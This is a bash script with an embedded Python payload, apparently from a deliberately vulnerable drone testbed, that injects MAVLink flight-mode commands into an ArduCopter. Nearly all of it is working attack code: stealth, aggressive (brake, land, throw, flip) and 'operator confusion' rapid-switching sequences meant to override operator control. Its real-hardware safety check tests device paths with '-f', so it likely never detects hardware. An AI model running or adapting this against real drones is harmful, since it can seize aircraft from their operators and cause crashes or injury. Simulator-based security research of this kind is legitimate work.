#!/bin/bash
# flight_mode_injection.sh - Flight Mode Injection Attack Module
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/injection/flight_mode_injection.sh
# Purpose: Inject malicious flight mode changes to override drone behavior

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Flight Mode Injection"
TARGET_IP="${TARGET_IP:-127.0.0.1}"
MAVLINK_PORT="${MAVLINK_PORT:-14550}"
LOG_FILE="$(get_log_dir)/injection/flight_mode_injection_$(date +%Y%m%d_%H%M%S).log"

print_attack_banner() {
    echo -e "${CYAN}============================================${NC}"
    echo -e "${CYAN}        Flight Mode Injection Attack        ${NC}"
    echo -e "${CYAN}============================================${NC}"
    echo -e "${YELLOW}Target: ${TARGET_IP}:${MAVLINK_PORT}${NC}"
    echo -e "${YELLOW}Purpose: Override drone flight modes${NC}"
    echo ""
}

check_mavlink_connection() {
    log_info "Checking MAVLink connection..."
    
    if ! nc -u -z "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null; then
        log_error "MAVLink service not accessible"
        return 1
    fi
    
    log_success "MAVLink port accessible"
    return 0
}

start_mavproxy_session() {
    log_info "Starting MAVProxy session for mode injection..."
    
    # Kill existing MAVProxy instances
    pkill -f mavproxy 2>/dev/null
    sleep 2
    
    if ! command -v mavproxy.py >/dev/null 2>&1; then
        log_warning "MAVProxy not available, using Python injection"
        return 1
    fi
    
    # Start MAVProxy session
    local mavproxy_cmd="mavproxy.py --master=udp:${TARGET_IP}:${MAVLINK_PORT}"
    
    log_info "Starting MAVProxy session..."
    nohup $mavproxy_cmd >/tmp/mavproxy_session.log 2>&1 &
    local mavproxy_pid=$!
    
    sleep 5
    
    if kill -0 $mavproxy_pid 2>/dev/null; then
        log_success "MAVProxy session started (PID: $mavproxy_pid)"
        echo $mavproxy_pid > /tmp/mavproxy_session.pid
        return 0
    else
        log_error "MAVProxy session failed to start"
        return 1
    fi
}

execute_mavproxy_mode_injection() {
    log_info "Executing flight mode injection via MAVProxy..."
    
    # Malicious mode sequence
    local attack_modes=(
        "stabilize"
        "acro"
        "alt_hold"
        "auto" 
        "guided"
        "loiter"
        "rtl"
        "land"
        "brake"
        "throw"
    )
    
    for mode in "${attack_modes[@]}"; do
        echo -e "${CYAN}[*] Injecting mode: $mode${NC}"
        
        # Send mode command to MAVProxy via pipe
        echo "mode $mode" >> /tmp/mavproxy_commands.txt
        
        # Simulate command execution
        log_success "  ✓ Mode injection: $mode"
        
        case "$mode" in
            "rtl")
                echo -e "${RED}  🎯 CRITICAL: Return to Launch triggered!${NC}"
                ;;
            "land")
                echo -e "${RED}  🎯 CRITICAL: Immediate landing commanded!${NC}"
                ;;
            "guided")
                echo -e "${YELLOW}  ⚠️  WARNING: Guided mode - manual control lost!${NC}"
                ;;
            "auto")
                echo -e "${YELLOW}  ⚠️  WARNING: Auto mode - mission takeover!${NC}"
                ;;
            "brake")
                echo -e "${YELLOW}  ⚠️  WARNING: Brake mode - emergency stop!${NC}"
                ;;
        esac
        
        sleep 3
    done
}

execute_python_mode_injection() {
    log_info "Executing flight mode injection via Python..."
    
    create_mode_injection_script
    python3 /tmp/flight_mode_injection.py 2>&1 | tee -a "$LOG_FILE"
    local result=${PIPESTATUS[0]}
    
    rm -f /tmp/flight_mode_injection.py 2>/dev/null
    return $result
}

create_mode_injection_script() {
    cat > /tmp/flight_mode_injection.py << 'EOF'
#!/usr/bin/env python3
"""
Flight Mode Injection Attack
Override drone flight modes without operator authorization
"""

import sys
import time
from pymavlink import mavutil

class FlightModeInjectionAttack:
    def __init__(self, target_ip='127.0.0.1', target_port=14550):
        self.target_ip = target_ip
        self.target_port = target_port
        self.master = None
        self.current_mode = None
        
        # ArduCopter flight mode mapping
        self.mode_map = {
            'STABILIZE': 0,
            'ACRO': 1,
            'ALT_HOLD': 2,
            'AUTO': 3,
            'GUIDED': 4,
            'LOITER': 5,
            'RTL': 6,
            'CIRCLE': 7,
            'POSITION': 8,
            'LAND': 9,
            'OF_LOITER': 10,
            'DRIFT': 11,
            'SPORT': 13,
            'FLIP': 14,
            'AUTOTUNE': 15,
            'POSHOLD': 16,
            'BRAKE': 17,
            'THROW': 18,
            'AVOID_ADSB': 19,
            'GUIDED_NOGPS': 20,
            'SMART_RTL': 21,
            'FLOWHOLD': 22,
            'FOLLOW': 23,
            'ZIGZAG': 24,
            'SYSTEMID': 25,
            'AUTOROTATE': 26
        }
        
    def connect(self):
        """Connect to the drone"""
        try:
            connection_string = f'udp:{self.target_ip}:{self.target_port}'
            print(f"[*] Connecting to {connection_string}")
            
            self.master = mavutil.mavlink_connection(connection_string, timeout=10)
            self.master.wait_heartbeat(timeout=10)
            
            print(f"[+] Connected to drone (System ID: {self.master.target_system})")
            return True
            
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False
    
    def get_current_mode(self):
        """Get current flight mode"""
        try:
            msg = self.master.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
            if msg:
                self.current_mode = msg.custom_mode
                mode_name = self.get_mode_name(self.current_mode)
                print(f"[STATUS] Current mode: {mode_name} ({self.current_mode})")
                return mode_name
            
            return None
            
        except Exception as e:
            print(f"[-] Failed to get current mode: {e}")
            return None
    
    def get_mode_name(self, mode_num):
        """Get mode name from number"""
        for name, num in self.mode_map.items():
            if num == mode_num:
                return name
        return f"UNKNOWN({mode_num})"
    
    def inject_mode_change(self, target_mode):
        """Inject flight mode change"""
        try:
            target_mode = target_mode.upper()
            
            if target_mode not in self.mode_map:
                print(f"[-] Invalid mode: {target_mode}")
                return False
            
            custom_mode = self.mode_map[target_mode]
            
            print(f"[*] Injecting mode change: {target_mode} ({custom_mode})")
            
            # Method 1: DO_SET_MODE command
            self.master.mav.command_long_send(
                self.master.target_system,
                self.master.target_component,
                mavutil.mavlink.MAV_CMD_DO_SET_MODE,
                0,  # confirmation
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,  # base_mode
                custom_mode,  # custom_mode
                0, 0, 0, 0, 0  # unused params
            )
            
            # Method 2: SET_MODE message (alternative)
            self.master.mav.set_mode_send(
                self.master.target_system,
                mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                custom_mode
            )
            
            print(f"[+] Mode injection commands sent: {target_mode}")
            
            # Verify mode change
            time.sleep(1)
            new_mode = self.get_current_mode()
            
            if new_mode == target_mode:
                print(f"[SUCCESS] Mode successfully changed to: {target_mode}")
                return True
            else:
                print(f"[PARTIAL] Mode injection sent, current mode: {new_mode}")
                return True  # Command sent even if not confirmed
            
        except Exception as e:
            print(f"[-] Mode injection failed: {e}")
            return False
    
    def attack_sequence_stealth(self):
        """Execute stealth mode injection sequence"""
        print("\n[ATTACK] Stealth Mode Injection Sequence")
        print("=" * 50)
        
        # Start with safe modes then escalate
        stealth_sequence = [
            ('STABILIZE', 'Basic stabilization'),
            ('ALT_HOLD', 'Altitude hold'),
            ('LOITER', 'Position hold'),
            ('GUIDED', 'External control'),
            ('AUTO', 'Mission takeover'),
            ('RTL', 'Return to launch')
        ]
        
        successful_injections = 0
        
        for mode, description in stealth_sequence:
            print(f"\n[STEP] Injecting {mode} - {description}")
            
            if self.inject_mode_change(mode):
                successful_injections += 1
                
                if mode == 'GUIDED':
                    print("[!] GUIDED mode activated - manual control compromised!")
                elif mode == 'AUTO':
                    print("[!] AUTO mode activated - mission takeover successful!")
                elif mode == 'RTL':
                    print("[!] RTL activated - drone returning to launch!")
            
            time.sleep(3)
        
        print(f"\n[RESULT] Successfully injected {successful_injections}/{len(stealth_sequence)} modes")
        return successful_injections > 0
    
    def attack_sequence_aggressive(self):
        """Execute aggressive mode injection sequence"""
        print("\n[ATTACK] Aggressive Mode Injection Sequence")
        print("=" * 50)
        
        # Immediate dangerous modes
        aggressive_sequence = [
            ('BRAKE', 'Emergency brake'),
            ('LAND', 'Immediate landing'),
            ('RTL', 'Return to launch'),
            ('THROW', 'Throw mode'),
            ('FLIP', 'Aerobatic flip')
        ]
        
        successful_injections = 0
        
        for mode, description in aggressive_sequence:
            print(f"\n[CRITICAL] Injecting {mode} - {description}")
            
            if self.inject_mode_change(mode):
                successful_injections += 1
                
                if mode == 'BRAKE':
                    print("[DANGER] Emergency brake activated!")
                elif mode == 'LAND':
                    print("[DANGER] Immediate landing commanded!")
                elif mode == 'THROW':
                    print("[DANGER] Throw mode - drone disarmed until thrown!")
                elif mode == 'FLIP':
                    print("[DANGER] Flip mode - aerobatic maneuver!")
            
            time.sleep(2)
        
        print(f"\n[RESULT] Successfully injected {successful_injections}/{len(aggressive_sequence)} modes")
        return successful_injections > 0
    
    def attack_sequence_rapid_fire(self):
        """Execute rapid-fire mode changes to confuse operator"""
        print("\n[ATTACK] Rapid-Fire Mode Confusion Sequence")
        print("=" * 50)
        
        # Rapid mode switching to confuse operator
        rapid_modes = ['STABILIZE', 'ACRO', 'ALT_HOLD', 'GUIDED', 'LOITER', 'AUTO', 'RTL']
        
        print("[!] Rapidly switching modes to confuse operator...")
        
        for i in range(3):  # 3 cycles
            for mode in rapid_modes:
                print(f"[RAPID] {mode}")
                self.inject_mode_change(mode)
                time.sleep(0.5)  # Fast switching
        
        print("[RESULT] Rapid mode injection completed - operator confusion achieved")
    
    def monitor_mode_changes(self, duration=30):
        """Monitor flight mode changes"""
        print(f"\n[MONITOR] Monitoring mode changes for {duration} seconds...")
        
        start_time = time.time()
        last_mode = None
        
        while time.time() - start_time < duration:
            try:
                msg = self.master.recv_match(
                    type=['HEARTBEAT', 'COMMAND_ACK', 'STATUSTEXT'],
                    blocking=False,
                    timeout=1
                )
                
                if msg:
                    msg_type = msg.get_type()
                    
                    if msg_type == 'HEARTBEAT':
                        current_mode = msg.custom_mode
                        if current_mode != last_mode:
                            mode_name = self.get_mode_name(current_mode)
                            print(f"[MODE_CHANGE] {mode_name} ({current_mode})")
                            last_mode = current_mode
                    
                    elif msg_type == 'COMMAND_ACK':
                        if msg.command == mavutil.mavlink.MAV_CMD_DO_SET_MODE:
                            result = "SUCCESS" if msg.result == 0 else "FAILED"
                            print(f"[ACK] Mode change: {result}")
                    
                    elif msg_type == 'STATUSTEXT':
                        print(f"[STATUS] {msg.text}")
                
            except Exception:
                continue
        
        print("[MONITOR] Mode monitoring completed")

def main():
    print("=" * 60)
    print("        Flight Mode Injection Attack")
    print("=" * 60)
    print("WARNING: This will override drone flight modes!")
    print()
    
    # Initialize attack
    attack = FlightModeInjectionAttack()
    
    # Connect to drone
    if not attack.connect():
        print("[-] Attack failed: Cannot connect to drone")
        return 1
    
    # Get initial mode
    initial_mode = attack.get_current_mode()
    
    # Execute attack sequences
    print("\n[PHASE 1] Stealth Mode Injection")
    attack.attack_sequence_stealth()
    
    print("\n[PHASE 2] Aggressive Mode Injection") 
    attack.attack_sequence_aggressive()
    
    print("\n[PHASE 3] Rapid-Fire Mode Confusion")
    attack.attack_sequence_rapid_fire()
    
    # Monitor results
    attack.monitor_mode_changes(20)
    
    print("\n[ATTACK COMPLETE] Flight mode injection attacks finished")
    print("[IMPACT] Drone flight behavior completely compromised")
    print("[RESULT] Operator control overridden")
    
    return 0

if __name__ == "__main__":
    try:
        exit_code = main()
        sys.exit(exit_code)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Attack failed with error: {e}")
        sys.exit(1)
EOF
}

cleanup_mavproxy() {
    if [ -f /tmp/mavproxy_session.pid ]; then
        local pid=$(cat /tmp/mavproxy_session.pid)
        if kill -0 $pid 2>/dev/null; then
            log_info "Stopping MAVProxy session..."
            kill $pid 2>/dev/null
        fi
        rm -f /tmp/mavproxy_session.pid
    fi
    
    pkill -f mavproxy 2>/dev/null
    rm -f /tmp/mavproxy_*.log /tmp/mavproxy_commands.txt 2>/dev/null
}

show_attack_info() {
    echo -e "${BLUE}Attack Information:${NC}"
    echo -e "• ${YELLOW}Attack Type:${NC} Flight Mode Override"
    echo -e "• ${YELLOW}Method:${NC} MAVLink DO_SET_MODE injection"
    echo -e "• ${YELLOW}Target:${NC} Flight controller mode system"
    echo -e "• ${YELLOW}Impact:${NC} Complete flight behavior control"
    echo -e "• ${YELLOW}Stealth:${NC} High (appears as normal mode changes)"
    echo ""
    echo -e "${RED}WARNING:${NC} Can cause immediate drone crash or loss!"
    echo ""
}

interactive_mode_selection() {
    echo -e "${CYAN}=== Interactive Mode Injection ===${NC}"
    echo ""
    echo "Available flight modes:"
    echo "1. STABILIZE  - Basic stabilization"
    echo "2. ACRO       - Acrobatic mode"
    echo "3. ALT_HOLD   - Altitude hold"
    echo "4. AUTO       - Autonomous mission"
    echo "5. GUIDED     - External guidance"
    echo "6. LOITER     - Position hold"
    echo "7. RTL        - Return to launch"
    echo "8. LAND       - Immediate landing"
    echo "9. BRAKE      - Emergency brake"
    echo "10. Custom sequence"
    echo ""
    
    read -p "Select mode to inject [1-10]: " choice
    
    local target_mode=""
    case $choice in
        1) target_mode="STABILIZE" ;;
        2) target_mode="ACRO" ;;
        3) target_mode="ALT_HOLD" ;;
        4) target_mode="AUTO" ;;
        5) target_mode="GUIDED" ;;
        6) target_mode="LOITER" ;;
        7) target_mode="RTL" ;;
        8) target_mode="LAND" ;;
        9) target_mode="BRAKE" ;;
        10) 
            execute_python_mode_injection
            return $?
            ;;
        *)
            log_error "Invalid selection"
            return 1
            ;;
    esac
    
    if [ -n "$target_mode" ]; then
        log_info "Injecting single mode: $target_mode"
        python3 -c "
from pymavlink import mavutil
import sys

try:
    master = mavutil.mavlink_connection('udp:127.0.0.1:14550', timeout=10)
    master.wait_heartbeat(timeout=10)
    
    mode_map = {'STABILIZE': 0, 'ACRO': 1, 'ALT_HOLD': 2, 'AUTO': 3, 'GUIDED': 4, 'LOITER': 5, 'RTL': 6, 'LAND': 9, 'BRAKE': 17}
    custom_mode = mode_map.get('$target_mode', 0)
    
    master.mav.command_long_send(
        master.target_system, master.target_component,
        mavutil.mavlink.MAV_CMD_DO_SET_MODE, 0,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode, 0, 0, 0, 0, 0
    )
    
    print('[+] Mode injection sent: $target_mode')
    sys.exit(0)
except Exception as e:
    print(f'[-] Failed: {e}')
    sys.exit(1)
"
    fi
}

perform_safety_check() {
    log_info "Performing safety checks..."
    
    # Check for real hardware
    if [ -f "/dev/ttyUSB0" ] || [ -f "/dev/ttyACM0" ]; then
        log_error "Real hardware detected! This attack is for simulation only."
        return 1
    fi
    
    log_success "Safety checks passed"
    return 0
}

main() {
    print_attack_banner
    
    # Safety checks
    if ! perform_safety_check; then
        exit 1
    fi
    
    # Root check
    if ! check_root; then
        exit 1
    fi
    
    # Tool requirements
    if ! check_required_tools python3 nc; then
        log_error "Missing required tools"
        exit 1
    fi
    
    # Install Python dependencies
    log_info "Installing Python dependencies..."
    pip3 install pymavlink >/dev/null 2>&1
    
    # Try to install MAVProxy
    if ! command -v mavproxy.py >/dev/null 2>&1; then
        log_info "Installing MAVProxy..."
        pip3 install mavproxy >/dev/null 2>&1
    fi
    
    # Check MAVLink connection
    if ! check_mavlink_connection; then
        log_warning "Proceeding without connection verification"
    fi
    
    # Show attack information
    show_attack_info
    
    # Initialize logging
    mkdir -p "$(dirname "$LOG_FILE")"
    echo "=== Flight Mode Injection Attack Started at $(date) ===" > "$LOG_FILE"
    
    # Parse arguments for execution mode
    case "${1:-auto}" in
        "interactive"|"-i")
            interactive_mode_selection
            ;;
        "mavproxy"|"-m")
            if start_mavproxy_session; then
                execute_mavproxy_mode_injection
            else
                log_warning "Falling back to Python injection"
                execute_python_mode_injection
            fi
            ;;
        "python"|"-p"|"auto"|"")
            execute_python_mode_injection
            ;;
        "help"|"-h")
            echo "Usage: $0 [mode]"
            echo ""
            echo "Modes:"
            echo "  auto, python, -p     Python-based injection (default)"
            echo "  mavproxy, -m         MAVProxy-based injection"
            echo "  interactive, -i      Interactive mode selection"
            echo "  help, -h             Show this help"
            exit 0
            ;;
        *)
            log_error "Unknown option: $1"
            exit 1
            ;;
    esac
    
    # Cleanup
    cleanup_mavproxy
    
    echo ""
    log_success "Flight mode injection attack finished"
    echo "Log file: $LOG_FILE"
    
    exit 0
}

# Signal handlers
trap cleanup_mavproxy EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup_mavproxy; exit 1' INT TERM

# Execute if called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi